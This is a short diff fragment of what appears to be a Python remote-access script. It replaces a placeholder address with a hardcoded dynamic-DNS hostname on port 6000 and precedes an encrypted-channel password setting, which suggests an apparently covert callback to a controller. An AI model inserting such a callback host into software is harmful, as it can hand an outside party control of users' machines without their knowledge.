@@ -36,7 +36,7 @@ else:
     TMP = "/tmp"
 
 # connection/access settings ##############
-dns = '0.0.0.0'
+dns = 'repentless.ddns.net'
 port = 6000
 ip = socket.gethostbyname(dns)
 # AES channel password ##############
